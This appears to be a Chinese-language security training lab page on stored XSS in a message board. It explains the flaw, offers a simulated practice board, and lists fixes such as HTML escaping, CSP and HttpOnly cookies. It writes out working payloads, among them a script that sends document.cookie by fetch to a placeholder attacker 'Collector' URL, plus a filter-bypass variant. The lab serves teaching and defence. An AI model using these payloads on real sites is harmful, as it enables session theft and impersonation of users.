Lab 02

XSS 留言板

留言板把留言內容原封不動輸出到網頁，攻擊者存入的惡意腳本會在每一位瀏覽該留言的使用者端執行，藉此竊取 cookie 並冒用其登入身分。

嚴重度 High   留言板 + Collector

漏洞原理

留言內容未經編碼即插入 HTML，屬於 Stored XSS：惡意腳本存進資料庫後長期存在，之後每一位看到該留言的使用者，瀏覽器都會執行它。靶機並刻意讓 cookie 可被 JavaScript 讀取（document.cookie），這是竊取 cookie 的前提。腳本讀到 cookie 後，以 fetch 送往攻擊者的 Collector，攻擊者即可用它冒用身分。

模擬練習

在下面的留言板發表留言。勾掉 Protected 時為有漏洞狀態；發出含腳本的留言，觀察 Collector 是否收到受害者 cookie。勾選 Protected 後再發一次，比較差異。

留言板

1. 驗證有無漏洞
<script>alert("XSS")</script>
2. 竊取 cookie 送往 Collector
<script>fetch("https://<Collector網址>/steal?cookie=" + document.cookie)</script>
3. script 被擋時的變形
<img src=x onerror=alert('XSS')>

留言列表

攻擊者 Collector

模擬受害者 cookie：session_id=demo-7f3a9b。所有效果皆為頁面內模擬，不會真的發出請求。

防禦修補

輸出時對使用者內容做 HTML escape，使 <script> 以純文字顯示而非執行（對應上面的 Protected 開關）；搭配 CSP 限制可載入的腳本來源；cookie 加上 HttpOnly，讓 JavaScript 無法讀取。
